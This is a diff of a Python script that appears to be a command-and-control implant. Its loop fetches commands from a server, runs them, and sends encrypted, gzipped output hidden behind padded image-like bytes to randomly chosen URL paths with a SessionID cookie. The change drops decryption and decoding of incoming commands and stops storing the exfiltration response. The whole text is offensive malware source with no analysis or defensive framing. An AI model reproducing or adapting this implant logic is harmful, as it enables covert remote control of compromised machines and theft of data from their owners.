@@ -115,9 +115,7 @@ while(True):
       print("error %%s" %% e)
     if html:
       try:
-        returncmd = decrypt(key, html)
-        returncmd = returncmd.rstrip('\\0')
-        returncmd = base64.b64decode(returncmd).decode("utf-8")
+        returncmd = html
         if "multicmd" in returncmd:
           returncmd = returncmd.replace("multicmd","")
           returnval = ""
@@ -219,7 +217,7 @@ while(True):
                 dataimage = data.ljust(1500, bytes('\x00', "utf-8"))
             enc=encrypt(key, returnval, gzipfile=True)
             dataimagebytes = dataimage+enc
-            response = send_request("/%%s%%s" %% (random.choice(urls), uri), data=dataimagebytes, headers={"Cookie" : f"SessionID={postcookie}"})
+            send_request("/%%s%%s" %% (random.choice(urls), uri), data=dataimagebytes, headers={"Cookie" : f"SessionID={postcookie}"})
 
       except Exception as e:
         print(e)
